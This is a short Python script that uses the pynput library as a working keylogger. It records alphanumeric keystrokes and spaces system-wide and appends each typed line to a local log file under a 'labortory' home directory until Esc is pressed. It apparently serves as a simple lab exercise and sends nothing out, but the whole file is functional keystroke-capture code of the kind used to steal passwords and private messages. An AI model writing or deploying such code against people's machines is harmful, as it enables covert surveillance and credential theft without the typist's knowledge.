import pynput
from pynput.keyboard import Listener, Key

lines = ""

def write_file(lines):
    with open('/home/kafka/labortory/log.txt', 'a') as f:
        f.write(lines + '\n')

def on_press(key):
    global lines
    if key == Key.enter:
        write_file(lines)
        lines = ""
    elif str(key).replace("'","").isalnum():
        lines += str(key).replace("'","")
    elif key == Key.space:
        lines += " "

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join() 